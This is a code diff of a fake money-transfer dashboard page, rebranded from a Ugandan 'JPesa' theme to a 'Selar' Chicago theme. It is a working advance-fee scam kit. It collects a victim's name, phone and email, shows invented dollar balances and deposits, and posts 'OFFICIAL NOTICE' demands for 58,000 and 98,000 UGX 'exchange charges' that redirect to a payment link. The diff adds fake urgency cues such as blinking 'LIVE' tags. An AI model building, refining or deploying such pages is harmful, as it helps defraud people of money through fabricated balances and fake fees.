@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Selar Transaction System - JPesa Theme</title>
+    <title>Selar Transaction System - Chicago Theme</title>
     <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -12,6 +12,7 @@
             --bg-light: #f1f3f4;
             --dark-text: #202124;
             --border-gray: #dadce0;
+            --success-green: #00a65a;
         }
 
         body {
@@ -32,7 +33,6 @@
             overflow: hidden;
         }
 
-        /* JPesa Header Theme */
         .top-banner {
             height: 60px;
             background: linear-gradient(90deg, #ffffff 0%, #1a73e8 70%, #8ab4f8 100%);
@@ -41,15 +41,12 @@
             padding: 0 15px;
         }
 
-        .payment-icons { height: 30px; }
-
         .header-content { text-align: right; padding: 20px; }
         .jpesa-title { color: var(--jpesa-red); font-size: 1.2rem; font-weight: bold; margin: 0; }
         .jpesa-sub { font-size: 0.7rem; color: #555; line-height: 1.2; }
 
-        .bank-logo { color: var(--jpesa-blue); font-size: 60px; margin: 20px; }
+        .bank-logo { color: var(--jpesa-blue); font-size: 60px; margin: 20px; text-align:center; }
 
-        /* Form Styling */
         .form-section { padding: 0 30px 30px; }
         .debit-note-bar { background: black; color: white; padding: 8px; font-weight: bold; letter-spacing: 2px; text-align: center; margin: 20px 0; }
         
@@ -58,7 +55,7 @@
         input { width: 100%; padding: 12px; border: 1px solid var(--border-gray); border-radius: 4px; box-sizing: border-box; background: #fafafa; }
 
         .btn-action {
-            background: #00a65a;
+            background: var(--success-green);
             color: white;
             border: none;
             width: 100%;
@@ -70,7 +67,6 @@
             margin-top: 10px;
         }
 
-        /* Dashboard Receipt Style */
         .receipt-card {
             border: 1px solid var(--border-gray);
             padding: 15px;
@@ -79,31 +75,25 @@
             margin-top: 15px;
         }
 
-        .watermark-paid {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%) rotate(-30deg);
-            font-size: 80px;
-            color: rgba(217, 48, 37, 0.15);
-            font-weight: 900;
-            pointer-events: none;
-            border: 8px solid rgba(217, 48, 37, 0.15);
-            padding: 10px;
-            display: none;
-        }
+        /* Blinking Green Effect */
+        @keyframes blinker { 50% { opacity: 0; } }
+        .blink-green { color: var(--success-green); font-weight: bold; animation: blinker 1s linear infinite; }
+        .live-tag { color: var(--success-green); font-weight: bold; font-size: 0.7rem; animation: blinker 1.5s linear infinite; margin-left: 5px; }
 
-        .active-watermark .watermark-paid { display: block; }
-
-        /* Payment Icons Grid */
         .payment-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 20px 0; }
-        .pay-box { border: 1px solid var(--border-gray); border-radius: 8px; padding: 10px; text-align: center; cursor: pointer; font-size: 0.7rem; font-weight: bold; background: #fff; }
+        .pay-box { border: 1px solid var(--border-gray); border-radius: 8px; padding: 10px; text-align: center; font-size: 0.7rem; font-weight: bold; background: #fff; }
+        
+        /* Specific Colors for Epay and Stripe */
+        .color-stripe { color: var(--jpesa-blue); cursor: pointer; }
+        .color-epay { color: var(--success-green); cursor: pointer; }
 
-        /* Modals */
         .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
         .modal { background: white; padding: 25px; border-radius: 8px; max-width: 400px; width: 100%; text-align: center; }
 
         .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid var(--jpesa-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .user-info-header { font-weight: bold; color: var(--dark-text); margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 5px; }
     </style>
 </head>
 <body>
@@ -111,23 +101,22 @@
 <div class="container" id="app">
     <div class="top-banner">
         <div style="background: white; padding: 5px; border-radius: 4px; display: flex; align-items: center;">
-            <span style="color:#0033a0; font-weight:bold; font-size: 12px; margin-right: 5px;">VISA</span>
-            <span style="color:#eb001b; font-weight:bold; font-size: 12px;">mastercard</span>
+            <span style="color:#0033a0; font-weight:bold; font-size: 10px;">Selar visa MasterCard Invoice</span>
         </div>
     </div>
 
     <div class="header-content">
-        <p class="jpesa-title">JPesa International</p>
-        <p class="jpesa-sub">Plot Z, Akright City, Entebbe Road<br>Kampala, UG | (256) 414 670513<br>TIN: 1014981413</p>
+        <p class="jpesa-title">Selar invoice International</p>
+        <p class="jpesa-sub">Plot Z, USA, Chicago, Brooklyn Street Road<br>P.O. Box 25630 - Chicago<br>+1-USA</p>
     </div>
 
     <div id="loginPage" class="form-section">
         <div class="bank-logo">🏛️</div>
-        <div class="debit-note-bar">REGISTRATION SYSTEM</div>
+        <div class="debit-note-bar">SELAR ACCOUNT</div>
         
-        <div class="field"><label>Legal Full Name</label><input type="text" id="regName" placeholder="Wasswa Lawrence"></div>
-        <div class="field"><label>Telephone Number</label><input type="text" id="regPhone" placeholder="256..."></div>
-        <div class="field"><label>Email Address</label><input type="email" id="regEmail" placeholder="lawrence@gmail.com"></div>
+        <div class="field"><label>Legal Full Name</label><input type="text" id="regName" placeholder=""></div>
+        <div class="field"><label>Telephone Number</label><input type="text" id="regPhone" placeholder=""></div>
+        <div class="field"><label>Email Address</label><input type="email" id="regEmail" placeholder=""></div>
         <div style="display:flex; gap:10px;">
             <div class="field" style="flex:1;"><label>Password</label><input type="password" placeholder="******"></div>
             <div class="field" style="flex:1;"><label>Confirm</label><input type="password" placeholder="******"></div>
@@ -136,17 +125,18 @@
     </div>
 
     <div id="dashboard" class="form-section" style="display:none;">
-        <div class="debit-note-bar">DASHBOARD ACCOUNT</div>
+        <div class="debit-note-bar">SELAR INVOICE ACCOUNT</div>
+        
+        <div id="userInfoDisplay" class="user-info-header"></div>
         
         <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; border-left: 5px solid var(--jpesa-blue);">
             <div style="font-size: 0.8rem; color: #666;">AVAILABLE BALANCE</div>
             <div id="ugxBalance" style="font-size: 1.8rem; font-weight: bold; color: var(--jpesa-blue);">0.00UGX</div>
-            <div style="font-size: 0.9rem;">Exact: <span id="usdBalance" style="font-weight: bold;">0.00</span>$</div>
+            <div style="font-size: 1rem;">Exact: <span id="usdBalance" class="blink-green">0.00$</span></div>
         </div>
 
         <div id="mainNotif" class="receipt-card">
-            <div class="watermark-paid">PAID</div>
-            <p id="notifText" style="font-size: 0.85rem; color: #444; margin: 0;">Successfully registered your SIM Card on Selar system. Send/Receive globally.</p>
+            <p id="notifText" style="font-size: 0.85rem; color: #444; margin: 0;"></p>
         </div>
 
         <div style="display:flex; gap:10px; margin-top:15px;">
@@ -155,15 +145,18 @@
         </div>
 
         <div class="payment-grid">
-            <div class="pay-box" id="airtelBtn" onmousedown="startLong()" onmouseup="endLong()" onclick="quickClick()"><span style="color:red">AIRTEL</span></div>
-            <div class="pay-box" id="mtnBtn" onmousedown="startLong()" onmouseup="endLong()" onclick="quickClick()"><span style="color:#ffcc00">MTN MOMO</span></div>
-            <div class="pay-box">STRIPE</div>
-            <div class="pay-box" id="epaySpecial" onmousedown="startEpayLong()" onmouseup="endEpayLong()">EPAY</div>
+            <div class="pay-box" style="color: #ccc; cursor: not-allowed;">AIRTEL</div>
+            <div class="pay-box" style="color: #ccc; cursor: not-allowed;">MTN MOMO</div>
+            <div class="pay-box color-stripe">STRIPE</div>
+            <div class="pay-box color-epay" id="epaySpecial" onmousedown="startEpayLong()" onmouseup="endEpayLong()">EPAY</div>
         </div>
 
-        <div id="recentActivity" class="receipt-card" style="border-top: 3px solid #eee;">
-            <label>Recent Activity</label>
-            <div id="activityLog" style="color: var(--jpesa-blue); font-weight: bold; font-size: 0.9rem;">No transactions</div>
+        <div id="recentActivity" class="receipt-card" style="border-top: 3px solid var(--success-green);">
+            <div style="display:flex; align-items:center; margin-bottom: 10px;">
+                <label style="margin:0;">Recent Activity</label>
+                <span class="live-tag">LIVE</span>
+            </div>
+            <div id="activityLog" style="color: var(--jpesa-blue); font-weight: bold; font-size: 0.95rem; background: #f0fdf4; padding: 10px; border-radius: 5px;">No transactions</div>
         </div>
     </div>
 </div>
@@ -173,12 +166,12 @@
 </div>
 
 <script>
-    let state = JSON.parse(localStorage.getItem('jpesaState')) || { step: 0, name: '', phone: '' };
+    let state = JSON.parse(localStorage.getItem('selarStateChicago')) || { step: 0, name: '', phone: '' };
     let longTimer;
 
     window.onload = () => { if(state.step > 0) renderStep(); };
 
-    function save() { localStorage.setItem('jpesaState', JSON.stringify(state)); }
+    function save() { localStorage.setItem('selarStateChicago', JSON.stringify(state)); }
 
     function register() {
         state.name = document.getElementById('regName').value;
@@ -192,24 +185,28 @@
     function renderStep() {
         document.getElementById('loginPage').style.display = 'none';
         document.getElementById('dashboard').style.display = 'block';
+        document.getElementById('userInfoDisplay').innerText = `${state.name} | ${state.phone}`;
+
+        if(state.step === 1) {
+             document.getElementById('notifText').innerHTML = "Successfully registered your SIM Card on Selar system. Send/Receive globally.";
+        }
 
         if(state.step === 2) {
             document.getElementById('ugxBalance').innerText = "743,000UGX";
-            document.getElementById('usdBalance').innerText = "200.00";
-            document.getElementById('notifText').innerHTML = `Your SIM Card doesn't support dollar deposit. Recharge with exchange charge of <b>58,000UGX</b>. Click withdrawal and fill ${state.phone.substring(0,2)}XXX.`;
+            document.getElementById('usdBalance').innerText = "200.00$";
+            document.getElementById('notifText').innerHTML = `<span style="color: #1a73e8; font-weight: bold;">OFFICIAL NOTICE:</span> Your SIM Card doesn't support dollar deposit. Recharge with exchange charge of <b style="color: var(--jpesa-red);">58,000UGX</b>. Click withdrawal and fill 07XXXXX.`;
             document.getElementById('activityLog').innerText = "Received 200.00$ from lolikishee, USA";
         }
 
         if(state.step === 3) {
-            document.getElementById('mainNotif').classList.add('active-watermark');
-            document.getElementById('notifText').innerHTML = `<b>PAID!</b> Foreign exchange charge 58,000UGX.<br>User: ${state.name}<br>Phone: ${state.phone}`;
+            document.getElementById('notifText').innerHTML = `<b>PAID!</b> Foreign exchange charge 58,000UGX.`;
             document.querySelectorAll('.btn-action').forEach(b => b.onclick = null);
         }
 
         if(state.step === 4) {
             document.getElementById('ugxBalance').innerText = "2,906,702.40UGX";
-            document.getElementById('usdBalance').innerText = "800.00";
-            document.getElementById('notifText').innerHTML = `Exchange charge needed <b>98,000UGX</b> to allow 800$ into UGX. Click withdrawal and fill ${state.phone.substring(0,2)}XXX.`;
+            document.getElementById('usdBalance').innerText = "800.00$";
+            document.getElementById('notifText').innerHTML = `<span style="color: #1a73e8; font-weight: bold;">OFFICIAL NOTICE:</span> Exchange charge needed <b style="color: var(--jpesa-red);">98,000UGX</b> to allow 800$ into UGX. Click withdrawal and fill 07XXXXX.`;
             document.getElementById('activityLog').innerText = "Received 800.00$ from lolikishee, USA";
         }
     }
@@ -234,26 +231,9 @@
     }
 
     function handleAction() {
+        if(state.step === 3) return;
         window.location.href = state.step >= 4 ? "https://pay.guto.app/@selara4?a=98000" : "https://pay.guto.app/@selara4?a=58000";
     }
-
-    function quickClick() { if(state.step < 3) alert("Can't access. Allow foreign charges to make withdrawal."); }
-
-    function startLong() {
-        if(state.step === 3) return;
-        longTimer = setTimeout(() => {
-            document.getElementById('overlay').style.display = 'flex';
-            document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Depositing 743,000UGX to ${state.phone}...</p>`;
-            setTimeout(() => {
-                document.getElementById('modalContent').innerHTML = `
-                    <h3 style="color:red">WITHDRAWAL DENIED</h3>
-                    <p>Selar system doesn't allow withdrawals of international transactions less than 1,000,000 UGX. Please top up.</p>
-                    <button class="btn-action" onclick="closeAndLock()">Okay, I Understand</button>`;
-            }, 10000);
-        }, 5000);
-    }
-
-    function closeAndLock() { document.getElementById('overlay').style.display = 'none'; state.step = 3; save(); renderStep(); }
 
     function startEpayLong() {
         if(state.step !== 3) return;
@@ -264,7 +244,6 @@
         }, 5000);
     }
 
-    function endLong() { clearTimeout(longTimer); }
     function endEpayLong() { clearTimeout(longTimer); }
 </script>
 </body>
